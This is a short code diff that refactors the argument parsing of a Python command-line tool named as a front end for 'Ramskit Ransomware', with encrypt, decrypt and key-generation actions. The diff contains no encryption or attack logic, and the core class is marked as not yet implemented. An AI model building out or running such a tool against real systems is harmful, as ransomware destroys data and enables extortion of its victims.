@@ -24,7 +24,7 @@ import argparse
 
 # TODO 1: Implement Ramskit class
 # TODO 2: Check CLI args
-if __name__ == '__main__':
+def main() -> None:
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
     parser.add_argument('-a', '--action', dest="action", required=True,
                         help='Action to perform [encrypt/decrypt/generate_key]')
@@ -55,4 +55,8 @@ if __name__ == '__main__':
         print(Ramskit.generate_key())
     else:
         raise Exception('Invalid action: ', action)
-        sys.exit(1)
+
+
+if __name__ == '__main__':
+    main()
+    sys.exit(0)
